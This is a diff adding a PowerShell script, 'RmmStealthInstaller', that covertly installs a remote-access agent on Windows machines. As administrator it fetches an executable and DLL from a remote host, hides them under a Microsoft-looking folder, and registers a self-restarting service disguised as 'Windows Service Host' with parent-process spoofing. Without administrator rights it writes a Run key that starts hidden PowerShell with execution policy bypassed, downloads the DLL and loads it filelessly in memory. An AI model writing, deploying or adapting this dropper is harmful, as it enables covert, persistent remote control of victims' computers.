@@ -1,0 +1,251 @@
+<#
+.SYNOPSIS
+    RmmStealthInstaller - installs the RMM agent stealthily.
+    Admin    -> downloads RmmBootstrap.exe + RmmAgent.dll + bootstrap.json (same layout as RmmInstaller),
+                installs Windows service -Name (real bootstrap; ServiceName + exe basename under Microsoft\Windows\rmm).
+    No admin -> fileless Run key, agent loaded in-memory via Reflection
+    Requires: Windows PowerShell 2.0+ for admin/bootstrap JSON; config URL must include a "server":"..." pair
+    (PS 2 uses regex; PS 3+ may use ConvertFrom-Json). Fileless path still depends on the agent (.NET 4.x+).
+.EXAMPLE
+    .\RmmStealthInstaller.ps1 -Config https://host/cfg.json
+    .\RmmStealthInstaller.ps1 -Uninstall
+#>
+param(
+    [string]$Config  = 'https://brconsulta.com/test/conf.cfg',
+    [string]$Name    = 'WinSvcHost',
+    [string]$Display = 'Windows Service Host',
+    [switch]$Uninstall
+)
+
+$ErrorActionPreference = 'Stop'
+
+$REG_HKLM = 'SOFTWARE\Classes\CLSID\{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
+$REG_HKCU = 'Software\Classes\CLSID\{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
+$RUN_KEY  = 'Software\Microsoft\Windows\CurrentVersion\Run'
+
+function Test-Admin {
+    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+        [Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+function Get-ServerUrl {
+    param([string]$url)
+    $raw = (New-Object Net.WebClient).DownloadString($url)
+    $srv = $null
+    if ($PSVersionTable.PSVersion.Major -ge 3) {
+        $j = $raw | ConvertFrom-Json
+        if ($j) { $srv = $j.server }
+    }
+    if (-not $srv -and ($raw -match '"server"\s*:\s*"([^"]+)"')) {
+        $srv = $matches[1]
+    }
+    if (-not $srv) { throw "Config missing 'server' key." }
+    $srv.TrimEnd('/')
+}
+
+function Escape-JsonStr {
+    param([string]$s)
+    if ($null -eq $s) { return '' }
+    return (($s -replace '\\', '\\\\') -replace '"', '\"')
+}
+
+function Write-BootstrapJson {
+    param(
+        [string]$LiteralPath,
+        [string]$AgentId,
+        [string]$ServerBase,
+        [string[]]$DownloadUrls,
+        [string]$Sha256,
+        [string]$SpawnMethod,
+        [string]$SpoofParent,
+        [string]$DllPath,
+        [string]$DataDirectory,
+        [string]$ServiceName,
+        [int]$WatchIntervalMs
+    )
+    $urlParts = @()
+    foreach ($u in $DownloadUrls) {
+        $urlParts += ('"' + (Escape-JsonStr $u) + '"')
+    }
+    $urlsJoined = [string]::Join(', ', $urlParts)
+    $json = @"
+{
+  "AgentId": "$(Escape-JsonStr $AgentId)",
+  "ServerBase": "$(Escape-JsonStr $ServerBase)",
+  "DownloadUrls": [ $urlsJoined ],
+  "Sha256": "$(Escape-JsonStr $Sha256)",
+  "SpawnMethod": "$(Escape-JsonStr $SpawnMethod)",
+  "SpoofParent": "$(Escape-JsonStr $SpoofParent)",
+  "DllPath": "$(Escape-JsonStr $DllPath)",
+  "DataDirectory": "$(Escape-JsonStr $DataDirectory)",
+  "ServiceName": "$(Escape-JsonStr $ServiceName)",
+  "WatchIntervalMs": $WatchIntervalMs
+}
+"@
+    Set-Content -LiteralPath $LiteralPath -Value $json.Trim() -Encoding UTF8
+}
+
+# --- Admin path (real RmmBootstrap + bootstrap.json, same idea as RmmInstaller) ---
+
+function Install-AsAdmin {
+    Write-Host "[*] Fetching config from $Config..."
+    $srv = Get-ServerUrl $Config
+    $base = $srv.TrimEnd('/')
+    Write-Host "[+] Server: $srv"
+
+    # Same tree as RmmInstaller admin (%ProgramData%\Microsoft\Windows\rmm); exe renamed for stealth.
+    $installRoot = Join-Path $env:ProgramData 'Microsoft\Windows\rmm'
+    if (-not (Test-Path $installRoot)) {
+        New-Item -ItemType Directory -Path $installRoot -Force | Out-Null
+    }
+
+    $bootExe = Join-Path $installRoot "$Name.exe"
+    $dllPath = Join-Path $installRoot 'RmmAgent.dll'
+    $cfgPath = Join-Path $installRoot 'bootstrap.json'
+    $idPath  = Join-Path $installRoot 'agent.id'
+
+    Write-Host "[*] Downloading RmmBootstrap.exe -> $bootExe"
+    $wc = New-Object Net.WebClient
+    try {
+        $wc.DownloadFile("$base/download/RmmBootstrap.exe", $bootExe)
+    } finally {
+        $wc.Dispose()
+    }
+
+    Write-Host "[*] Downloading RmmAgent.dll -> $dllPath"
+    $wc2 = New-Object Net.WebClient
+    try {
+        $wc2.DownloadFile("$base/download/RmmAgent.dll", $dllPath)
+    } finally {
+        $wc2.Dispose()
+    }
+
+    $agentId = $null
+    if (Test-Path $idPath) {
+        $agentId = ([System.IO.File]::ReadAllText($idPath)).Trim()
+    }
+    if (-not $agentId) {
+        $agentId = [guid]::NewGuid().ToString('N')
+    }
+    Set-Content -LiteralPath $idPath -Value $agentId -Encoding ascii -NoNewline
+
+    Write-BootstrapJson -LiteralPath $cfgPath `
+        -AgentId $agentId `
+        -ServerBase $srv `
+        -DownloadUrls @("$base/download/RmmAgent.dll") `
+        -Sha256 '' `
+        -SpawnMethod 'activeuser' `
+        -SpoofParent 'explorer.exe' `
+        -DllPath $dllPath `
+        -DataDirectory $installRoot `
+        -ServiceName $Name `
+        -WatchIntervalMs 5000
+    Write-Host "[+] bootstrap.json / agent.id written under $installRoot"
+
+    # Service SCM name + bootstrap.json ServiceName must match (RmmBootstrap --service reads JSON).
+    $svcName = $Name
+    Write-Host "[*] Installing service '$svcName' -> `"$bootExe`" --service"
+    sc.exe stop $svcName 2>$null
+    Start-Sleep -Seconds 2
+    sc.exe delete $svcName 2>$null
+    Start-Sleep -Seconds 1
+
+    # Paths under ProgramData normally have no spaces; SCM accepts binPath= exe --service
+    sc.exe create $svcName "binPath=$bootExe --service" start= auto "DisplayName=$Display"
+    sc.exe description $svcName "Remote Management Service"
+    sc.exe failure $svcName reset= 60 actions= restart/5000/restart/10000/restart/30000
+    sc.exe start $svcName
+    Write-Host "[+] Service $svcName started."
+}
+
+# --- User path (fileless) ---
+
+function Install-AsUser {
+    Write-Host "[*] No admin - fileless user-mode installation."
+
+    Write-Host "[*] Fetching config from $Config..."
+    $srv = Get-ServerUrl $Config
+    Write-Host "[+] Server: $srv"
+
+    Write-Host "[*] Writing HKCU registry..."
+    # .NET 4+: second parameter is RegistryKeyPermissionCheck, not bool; single-arg CreateSubKey is writable.
+    $k = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($REG_HKCU)
+    $k.SetValue('C', [string]$Config, 'String')
+    $k.SetValue('U', [string]$srv,    'String')
+    $k.Close()
+    Write-Host "[+] Registry: HKCU\$REG_HKCU"
+
+    $hkcuPath = 'Software\Classes\CLSID\{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
+    $runner = '$k=[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(''' + $hkcuPath + '''); ' +
+              'if(-not $k){exit}; ' +
+              '$u=$k.GetValue(''U''); $k.Close(); ' +
+              'if(-not $u){exit}; ' +
+              '$env:RMM_SERVER=$u; $env:RMM_FILELESS=''1''; $env:RMM_DEBUG=''1''; $env:RMM_ALLOW_MODULES=''''; ' +
+              '$d=5; while($true){ try{ ' +
+              '$dll=(New-Object Net.WebClient).DownloadData($u+''/download/RmmAgent.dll''); ' +
+              '$asm=[Reflection.Assembly]::Load($dll); ' +
+              '$tp=$asm.GetType(''RmmAgent.Core.AgentEntryPoint''); ' +
+              '$m=$tp.GetMethod(''RunAsync'',[Reflection.BindingFlags]''Public,Static''); ' +
+              '$m.Invoke($null,@([Threading.CancellationToken]::None)).GetAwaiter().GetResult(); break ' +
+              '}catch{Start-Sleep $d; if($d -lt 300){$d=$d*2}} }'
+
+    # conhost.exe --headless is not available on Windows 7; plain powershell keeps the same flags.
+    $cmd = 'conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {' + $runner + '}"'
+
+    Write-Host "[*] Writing Run key..."
+    $rk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(
+        $RUN_KEY, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree)
+    $rk.SetValue($Name, $cmd, 'String')
+    $rk.Close()
+    Write-Host "[+] Run key: HKCU\$RUN_KEY\$Name"
+
+    Write-Host "[*] Launching agent..."
+    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& { $runner }`"" -WindowStyle Hidden
+    Write-Host "[+] Agent launched."
+}
+
+# --- Uninstall ---
+
+function Uninstall-All {
+    if (Test-Admin) {
+        sc.exe stop $Name 2>$null
+        Start-Sleep -Seconds 2
+        sc.exe delete $Name 2>$null
+
+        $installRoot = Join-Path $env:ProgramData 'Microsoft\Windows\rmm'
+        if (Test-Path $installRoot) {
+            Remove-Item -LiteralPath $installRoot -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        $legacyExe = "$env:ProgramData\Microsoft\Windows\$Name.exe"
+        if (Test-Path $legacyExe) { Remove-Item -LiteralPath $legacyExe -Force -ErrorAction SilentlyContinue }
+
+        $hklm = $null
+        try {
+            $hklm = [Microsoft.Win32.RegistryKey]::OpenBaseKey('LocalMachine', 'Registry64')
+        } catch {
+            # OpenBaseKey requires .NET 4+; Windows 7 with only .NET 3.5 falls back to LocalMachine.
+            $hklm = [Microsoft.Win32.Registry]::LocalMachine
+        }
+        try { $hklm.DeleteSubKeyTree($REG_HKLM, $false) } catch { }
+        if ($hklm) { $hklm.Close() }
+        Write-Host "[+] Admin artifacts removed."
+    }
+    try { [Microsoft.Win32.Registry]::CurrentUser.DeleteSubKeyTree($REG_HKCU, $false) } catch { }
+    $rk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(
+        $RUN_KEY, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree)
+    if ($rk) { $rk.DeleteValue($Name, $false); $rk.Close() }
+    Write-Host "[+] User artifacts removed."
+}
+
+# --- Entry point ---
+
+if ($Uninstall) {
+    Uninstall-All
+} elseif (-not $Config) {
+    Write-Error "Usage: .\RmmStealthInstaller.ps1 -Config <url>"
+    exit 1
+} elseif (Test-Admin) {
+    Install-AsAdmin
+} else {
+    Install-AsUser
+}
